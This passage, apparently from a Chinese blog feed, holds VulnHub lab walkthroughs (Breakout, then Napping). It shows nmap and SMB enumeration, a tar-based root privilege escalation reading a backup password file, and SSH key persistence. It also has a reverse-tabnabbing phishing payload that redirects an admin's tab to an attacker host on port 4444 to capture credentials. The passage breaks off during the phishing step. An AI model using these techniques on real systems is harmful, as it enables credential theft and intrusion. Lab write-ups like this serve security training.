&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-047.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.127&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.127 -oN /tmp/breakout.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-048.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;brainfuck-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#brainfuck-解密&#34;&gt;#&lt;/a&gt; Brainfuck 解密&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI3&#34;&gt;http://192.168.31.127&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.127&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-049.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;审查源代码&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到加密的密码如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;++++++++++[&amp;gt;+&amp;gt;+++&amp;gt;+++++++&amp;gt;++++++++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;&amp;gt;++++++++++++++++.++++.&amp;gt;&amp;gt;+++++++++++++++++.----.&amp;lt;++++++++++.-----------.&amp;gt;-----------.++++.&amp;lt;&amp;lt;+.&amp;gt;-.--------.++++++++++++++++++++&amp;lt;------------.&amp;gt;&amp;gt;---------.&amp;lt;&amp;lt;++++++.++++++.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;brainfuck 加密&lt;br&gt;
此为 brainfuck 加密：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr&#34;&gt;https://ctf.bugku.com/tool/brainfuck&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-050.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 某密码为  &lt;code&gt;.2uqPEfj3D&amp;lt;P&#39;a-3&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;smb-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smb-漏洞利用&#34;&gt;#&lt;/a&gt; SMB 漏洞利用&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;smbclient 枚举&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbclient -N -L 192.168.31.127&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-051.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;smbclient 测试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbclient //192.168.31.127/IPC$ -N&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-052.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Enum4linux 是用于枚举 windows 和 Linux 系统上的 SMB 服务的工具。可以轻松的从与 SMB 有关的目标中快速提取信息。通常可以确信，如果打开了端口 139 和 445 ，则 SMB 正在运行。使用 Enum4linux 收集信息我们需要做的第一件事是确定目标上是否存在 SMB。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用enum4linux 进行枚举SMB 信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;enum4linux -A 192.168.31.127&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-053.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到一个用户名：cyber&lt;/p&gt;
&lt;h3 id=&#34;tar-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tar-提权&#34;&gt;#&lt;/a&gt; Tar 提权&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;登录服务器&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh cyber@192.168.31.127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Pass:.2uqPEfj3D&amp;lt;P&lt;span class=&#34;string&#34;&gt;&amp;#x27;a-3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-054.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;找到一个敏感命令 tar 可以用调用 root 权限&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-055.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;寻找敏感文件&lt;br&gt;
 &lt;code&gt;ls /var/backups/ -Alh&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-056.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;利用 tar 及备份文件&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用具有root权限的tar去压缩这个备份文件里边的密码:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./tar -zcvf pass.tar.gz /var/backups/.old_pass.bak&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进行解压：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxvf pass.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看解压之后的文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ./var/backups/.old_pass.bak&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码显示为：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ts&amp;amp;4&amp;amp;YurgtRX(=~h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-057.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ssh-密钥对维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-密钥对维权&#34;&gt;#&lt;/a&gt; SSH 密钥对维权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;提前准备好配对好的私钥和公钥，将公钥发到靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/id_rsa.pub &amp;gt;&amp;gt; ~/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm - f id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-058.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用私钥登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ll | grep id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.127 -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-059.png&#34; width=&#34;515&#34; alt=&#34;Image&#34;&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/102%20NAPPING/</guid>
            <title>VULNHUB 2 NAPPING</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/102%20NAPPING/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbmFwcGluZy0xMDEsNzUyLw==&#34;&gt;https://www.vulnhub.com/entry/napping-101,752/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQuZ2l0bGFiLmlvL2hvbWUvdnVsbmh1Yi9uYXBwaW5nLw==&#34;&gt;https://readysetexploit.gitlab.io/home/vulnhub/napping/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-012.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;netdiscover 未发现目标主机，nmap 进一步扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-013.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.170&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.170 - oN /tmp/napping.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-014.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;钓鱼攻击web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#钓鱼攻击web&#34;&gt;#&lt;/a&gt; 钓鱼攻击 web&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcwLw==&#34;&gt;http://192.168.31.170/&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;观察页面可进行注册并且登陆账号&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-015.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-016.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;对此网站进行目录扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.170&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-017.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;3）观察登陆后的网站，发现存在跳转漏洞&lt;/p&gt;
&lt;p&gt;审查源代码之后，存在 target=’_blank’ 的代码，可进行利用&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-018.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;target=’_blank’漏洞利用：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3JldmVyc2UtdGFiLW5hYmJpbmc=&#34;&gt;https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-019.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 观察页面可知，管理员会执行页面上输入的 url 地址&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;接受访问着的用户名和密码并发送给 4444 端口，钓鱼管理员&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://192.168.31.170/index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat index.php &amp;amp;&amp;amp; mv index.php index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-020.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;现在该站点表明该页面的管理员将查看我们的链接，管员看到的是我们伪造的和对方 index.html 一样的界面，管员有可能认为自己的账号被注销会重新输入账户密码，而由于这是我们构造的界面，对方输入的信息将会被我们所监听。&lt;/p&gt;
&lt;p&gt;evil.html 的作用是重定向，本来的网址是 http://192.168.31.135/evil.html 但是访问&lt;br&gt;
的这个文件之后将被重定向为 http://192.168.31.135:4444/index.html&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; evil.html &amp;lt;&amp;lt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;title&amp;gt;My Blog&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(window.opener)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      window.opener.parent.location.replace(&amp;#x27;http://192.168.31.135:4444/index.html&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(window.opener != window)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      window.opener.parent.location.replace(&amp;#x27;http://192.168.31.135:4444/index.html&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-021.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提交指向我们 evil.html 链接&lt;br&gt;
然后点击链接&lt;br&gt;
我们将转到我们的 evil.html&lt;br&gt;
 但是原始标签将转到我们的 index.html，它看起来与登录页面完全相同&lt;br&gt;
确保 Python 服务器在端口 80 和 4444 上运行&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;钓鱼攻击，等待鱼儿上钩&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;启动 80 端口的 http 服务: python3 -m http.server 80&lt;br&gt;
 开启 80 服务后，对方可以访问到 http://192.168.31.135/evil.html 并且访问的这&lt;br&gt;
个文件之后将被重定向为 http://192.168.31.135:4444/index.html&lt;/p&gt;
&lt;p&gt;-&amp;gt; 我们从 4444 端口处监听以便捕捉到对方的用户名和密码！&lt;/p&gt;
